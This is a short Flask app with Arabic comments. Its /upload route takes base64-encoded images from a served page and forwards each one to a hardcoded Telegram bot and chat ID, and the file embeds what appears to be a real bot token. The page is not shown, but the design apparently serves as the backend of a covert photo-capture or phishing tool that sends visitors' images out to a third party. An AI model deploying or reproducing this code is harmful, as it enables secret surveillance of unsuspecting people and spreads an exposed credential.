الملف الأول: app.py
اسم الملف: app.py
الكود:
from flask import Flask, request, render_template, jsonify
import requests
import os

app = Flask(__name__)

# معلومات البوت
BOT_TOKEN = "8485606950:AAGM9hMgwVV-QG5zlob2TGMuoxNucWkieyI"
CHAT_ID = "7628738409"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # استقبال الصورة
        image_data = request.json.get('image')
        
        # تحويل base64 إلى ملف
        import base64
        image_binary = base64.b64decode(image_data.split(',')[1])
        
        # إرسال الصورة للتيليجرام
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', image_binary, 'image/jpeg')}
        data = {'chat_id': CHAT_ID}
        
        response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error', 'message': 'Failed to send'})
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
